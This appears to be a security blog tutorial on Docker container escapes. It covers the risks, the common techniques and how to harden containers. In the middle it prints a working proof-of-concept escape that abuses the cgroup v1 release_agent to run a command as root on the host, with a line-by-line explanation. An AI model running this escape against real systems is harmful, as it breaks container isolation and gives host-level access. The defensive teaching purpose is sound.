Docker container escapes happen when a process running within a container manages to break free of its isolated environment and gain access to the underlying host system.
This is essentially a security breach, giving an attacker a foothold on the host machine.
Privilege Escalation: Escaping allows attackers to run programs or access resources on the host system with potentially more privileges than intended for the container.
Lateral Movement: Once on the host, attackers can use the compromised container as a springboard to attack other containers or the host itself.
Exploiting Weaknesses:

There are various ways attackers can achieve a container escape. These typically involve exploiting vulnerabilities in the Docker configuration or the container itself. Here are some common techniques:

- Misconfigured Privileges: Running a container with unnecessary privileges (like full root access) increases the risk.
- Mounted Host Filesystem: If the entire host filesystem is accidentally mounted inside the container, attackers can potentially access and modify host files.
- Docker Socket Access: Gaining access to the Docker socket inside the container allows controlling the Docker daemon on the host, potentially for malicious purposes.
- Kernel Vulnerabilities: Exploiting vulnerabilities in the Linux kernel itself can be used to bypass container isolation mechanisms.

# Prevention Tips:

Least Privilege: Run containers with the minimum set of privileges required for the application to function.
Limit File Access: Avoid mounting the entire host filesystem inside containers.
Restrict Capabilities: Don't grant unnecessary capabilities like SYS_ADMIN to containers.
Keep Software Updated: Regularly update Docker and the container image base to patch known vulnerabilities.
Monitor for Suspicious Activity: Implement security monitoring to detect suspicious activity within containers.

# Requirements to use this technique

n fact, --privileged provides far more permissions than needed to escape a docker container via this method. In reality, the “only” requirements are:

1. We must be running as root inside the container
2. The container must be run with the SYS_ADMIN Linux capability
3. The container must lack an AppArmor profile, or otherwise allow the mount syscall
4. The cgroup v1 virtual filesystem must be mounted read-write inside the container

The SYS_ADMIN capability allows a container to perform the mount syscall.
see the documentation https://linux.die.net/man/7/capabilities

A container would be vulnerable to this technique if run with the flags: --security-opt apparmor=unconfined --cap-add=SYS_ADMIN

# Using cgroups to deliver the exploit

Linux cgroups are one of the mechanisms by which Docker isolates containers. 
The PoC abuses the functionality of the notify_on_release feature in cgroups v1 to run the exploit as a fully privileged root user.

# Example

#On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
#In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Breaking down the proof of concept
Now that we understand the requirements to use this technique and have refined the proof of concept exploit, let’s walk through it line-by-line to demonstrate how it works.

To trigger this exploit we need a cgroup where we can create a release_agent file and trigger release_agent invocation by killing all processes in the cgroup. The easiest way to accomplish that is to mount a cgroup controller and create a child cgroup.

To do that, we create a /tmp/cgrp directory, mount the RDMA cgroup controller and create a child cgroup (named “x” for the purposes of this example). While every cgroup controller has not been tested, this technique should work with the majority of cgroup controllers.

If you’re following along and get “mount: /tmp/cgrp: special device cgroup does not exist”, it’s because your setup doesn’t have the RDMA cgroup controller. Change rdma to memory to fix it. We’re using RDMA because the original PoC was only designed to work with it.

Note that cgroup controllers are global resources that can be mounted multiple times with different permissions and the changes rendered in one mount will apply to another.

# Use containers securely

Do not use the --privileged flag or mount a Docker socket inside the container. The docker socket allows for spawning containers, so it is an easy way to take full control of the host, for example, by running another container with the --privileged flag.
Do not run as root inside the container. Use a different user or user namespaces. The root in the container is the same as on host unless remapped with user namespaces. It is only lightly restricted by, primarily, Linux namespaces, capabilities, and cgroups.
Drop all capabilities (--cap-drop=all) and enable only those that are required (--cap-add=...). Many of workloads don’t need any capabilities and adding them increases the scope of a potential attack.
Use the “no-new-privileges” security option to prevent processes from gaining more privileges, for example through suid binaries.
Limit resources available to the container. Resource limits can protect the machine from denial of service attacks.
Adjust seccomp, AppArmor (or SELinux) profiles to restrict the actions and syscalls available for the container to the minimum required.
Use official docker images or build your own based on them. Don’t inherit or use backdoored images.
Regularly rebuild your images to apply security patches. This goes without saying.
